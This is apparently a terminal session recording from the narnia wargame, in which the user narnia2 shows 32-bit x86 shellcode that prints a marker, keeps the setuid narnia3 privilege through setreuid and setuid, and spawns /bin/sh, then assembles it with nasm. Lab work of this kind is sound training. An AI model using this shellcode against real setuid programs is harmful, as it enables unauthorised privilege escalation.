[0.135, "o", "BITS 32\r\r\nglobal _start\r\r\n_start:\r\r\n    ; 1) write(1, \"PWN!\", 4) -- the marker the address sweep looks for\r\r\n    ;    \"PWN!\" as a little-endian dword is 0x214e5750\r\r\n    xor eax, eax\r\r\n    push eax\r\r\n    push 0x214e5750\r\r\n    mov ecx, esp\r\r\n    xor ebx, ebx\r\r\n    inc ebx\r\r\n    xor edx, edx\r\r\n    mov dl, 4\r\r\n    xor eax, eax\r\r\n    mov al, 4\r\r\n    int 0x80\r\r\n    ; 2) euid = geteuid(); setreuid(euid, euid)\r\r\n    ;    the binary is setuid narnia3, so euid is narnia3; without this\r\r\n    ;    execve(\"/bin/sh\") would drop back to narnia2\r\r\n    xor eax, eax\r\r\n    mov al, 201\r\r\n    int 0x80\r\r\n    mov ebx, eax\r\r\n    mov ecx, eax\r\r\n    xor eax, eax\r\r\n    mov al, 70\r\r\n    int 0x80\r\r\n    ; 3) setuid(euid) -- set real, effective AND saved uid, so the\r\r\n    ;    privilege survives execve (plain setreuid leaves saved = narnia2)\r\r\n    xor eax, eax\r\r\n    mov al, 201\r\r\n    int 0x80\r\r\n    mov ebx, eax\r\r\n    xor eax, eax\r\r\n    mov al, 23\r\r\n    int 0x80\r\r\n    ; 4) execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL)\r\r\n    xor eax, eax\r\r\n    push eax\r\r\n    push 0x68732f2f\r\r\n    push 0x6e69622f\r\r\n    mov ebx, esp\r\r\n    push eax\r\r\n    push ebx\r\r\n    mov ecx, esp\r\r\n    xor edx, edx\r\r\n    mov al, 11\r\r\n    int 0x80\r\r\n\r\r\n\u001b]3008;end=26d2ecc6-1e3c-487f-b2d5-c59a063f6047;exit=success\u001b\\\u001b]3008;start=fb767b35-ec89-450c-b9d7-21327b2c6b7a;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\\u001b[?2004h\u001b]0;narnia2@narnia: ~\u0007narnia2@narnia:~$ nasm -f elf32 /tmp/l2.asm -o /tmp/l2.o\r\r\n\u001b[?2004l\r\u001b]3008;start=5cf9098a-1417-4601-9d61-2c3144747815;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\